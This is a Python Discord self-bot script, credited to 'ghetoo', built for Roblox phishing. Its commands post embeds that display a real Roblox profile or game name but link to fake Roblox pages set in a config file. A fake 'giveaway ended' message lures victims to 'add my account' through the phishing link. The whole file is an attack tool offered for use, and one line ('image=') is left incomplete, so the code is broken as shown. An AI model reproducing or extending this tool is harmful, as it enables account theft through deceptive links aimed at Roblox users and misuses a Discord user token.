#FOLLOW THE FORMAT OF THE CONFIG FILE
#PHISG = FAKE ROBLOX GAME PAGE
#GAME = REAL ROBLOX GAME PAGE
#PHISP = FAKE ROBLOX PROFILE
#PROFILE = REAL ROBLOX PROFILE
import discord
from discord.ext import commands
from json import load
import re
import time


with open('config.json') as f:
    d = load(f)
    token = d["token"]
    prefix = d["prefix"]
    phisg = d["phisg"]
    phisp = d["phisp"]
    game1 = d["game"]
    profile1 = d["profile"]

bot = commands.Bot(command_prefix=prefix, self_bot=True, fetch_offline_members=False)
bot.remove_command('help')

@bot.event
async def on_ready():
    print("Made By ghetoo")
@bot.command()
async def help(ctx):
    await ctx.message.delete()
    embed = discord.Embed(
    title= "Ghetoo's 2 Hour Self Bot Help",
    description=f'`{prefix}profile` - sends fake roblox profile embed\n`{prefix}game` - sends fake roblox game embed\n`{prefix}giveaway (prize)` - sends giveaway embed',
    color=0xcf4948)
    await ctx.send(embed=embed)

@bot.command()
async def profile(ctx):
    await ctx.message.delete()
    embed = discord.Embed(
    description=f'[{profile1}]({phisp})',
    color=0xcf4948)
    await ctx.send(embed=embed)
    
@bot.command()
async def game(ctx):
    await ctx.message.delete()
    embed = discord.Embed(
    description=f'[{game1}]({phisg})',
    color=0xcf4948)
    await ctx.send(embed=embed)

@bot.command()
async def giveaway(ctx, *, prize):
    await ctx.message.delete()
    gwembed = discord.Embed(
    title="🎉 __**Giveaway Ended**__ 🎉",
    description=f':gift:Congrats You Won a {prize} add my account & join me get the {prize}:gift:\n[{profile1}]({phisp})',
    color=0xcf4948)
    image=
    await ctx.send(embed=gwembed)

bot.run(token, bot=False)
